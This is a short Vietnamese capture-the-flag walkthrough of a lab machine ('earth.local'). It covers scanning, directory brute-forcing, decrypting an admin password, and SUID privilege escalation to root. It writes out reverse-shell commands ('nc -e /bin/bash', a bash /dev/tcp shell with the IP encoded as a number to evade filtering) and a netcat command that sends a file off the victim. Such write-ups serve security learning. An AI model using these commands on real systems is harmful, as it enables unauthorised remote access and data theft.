1.	Netdiscover để tìm ip
 
2.	Nmap để scan cổng
 
3.	Brute force dung dirb
 
Tìm ra 1 đường link nhưng không thể truy cập
 
4.	Lấy quyền truy cập vào trang web mục tiêu bằng HTTPS thay vì HTTP
 
5.	Đã tìm thấy tên chung và tên DNS cho ứng dụng web đang chạy trên máy cá nhân
 
6.	Thêm host name với địa chỉ ip tương ứng
 
7.	Truy cạp vào earth.local
 
8.	Dirb lại scan earth.local
 
 	Tìm thấy admin path
9.	Vào phần admin
 
 
10.	Truy cập vào terratest.earth.local
 
11.	Dùng gobuster scan terratest.earth.local
 
Tìm thấy fole robot.txt
 
	Đọc file /testingnotes.txt
	 
Đọc file testdata
 
12.	Decrypt lời nhắn trên dung cyberchef 
“message” ở earth.local url
 
Và dung testdata như key
 
 
13.	Dùng output trên như password và ta đã truy cập được admin
 
14.	Chuẩn bị 1 cái listener
 
Chạy lệnh nc -e /bin/bash <your_ip_address> 4444 
 
 
Remote đã bị cắt
15.	Dùng reverseshell để vượt qua cái này
Chuyển IP của mình thành nhị phân
 
Chạy lệnh bash -i >& /dev/tcp/3232235876/4444 0>&1
 
 
16.	Vào mục var
 
 
Tìm thấy earth_web 
17.	Chuyển tới earth_web
 
Tìm thấy user_flag.txt
 
18.	Kiểm tra các file SUIDs để xem có cách nào có thể leo thang không
 
Tìm thấy 1 file tên là reset_root
19.	Pull file này về máy mình để crack
Chuẩn bị 1 netcat listener
 
Chạy lệnh này trên máy nạn nhân
nc -w 3 <your_ip > <your_assign_port> < reset_root
 
 
20.	Strings file reset_root
 
21.	Lấy root shell
 
Dung lệnh ltrace
 
Xem thử các file trên có tồn tại không
 

 

Reset password thành công
   
Tìm thấy root
 
Tìm ra root_flag
 
